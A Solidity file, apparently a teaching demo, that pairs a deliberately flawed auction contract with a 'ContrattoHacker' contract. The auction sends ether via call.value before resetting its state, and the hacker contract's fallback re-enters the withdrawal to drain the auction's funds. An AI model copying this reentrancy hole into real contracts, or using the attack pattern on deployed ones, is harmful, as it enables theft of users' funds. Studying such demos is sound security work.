pragma solidity ^0.4.0;
contract ContrattoFallato {

    uint256 public offertaMigliore = 0;
    address public offerenteMigliore = address(0);

    constructor() public payable {}

    function getBalance() external view returns(uint256) { return address(this).balance; }

    function ritiraOfferta() external payable {
        require(msg.sender == offerenteMigliore);
        msg.sender.call.value(offertaMigliore)(); //msg.sender.transfer(offertaMigliore); //msg.sender.call.value(offertaMigliore)();
        offertaMigliore = 0;
        offerenteMigliore = address(0);
    }

    function faiOfferta() external payable {
        require(msg.value > offertaMigliore);
        offerenteMigliore.transfer(offertaMigliore);

        offertaMigliore = msg.value;
        offerenteMigliore = msg.sender;
    }

}


contract ContrattoHacker {
    ContrattoFallato cf;

    constructor() public payable {}

    function getBalance() external view returns(uint256) { return address(this).balance; }

    function withdraw() external payable {
        cf.ritiraOfferta();
    }

    function setContractAddress(address caddr) external {
        cf = ContrattoFallato(caddr);
    }

    function crackMarket() external {
        cf.faiOfferta.value(1 ether)();
    }

    function() external payable {
        cf.ritiraOfferta();
       // revert();
    }
}
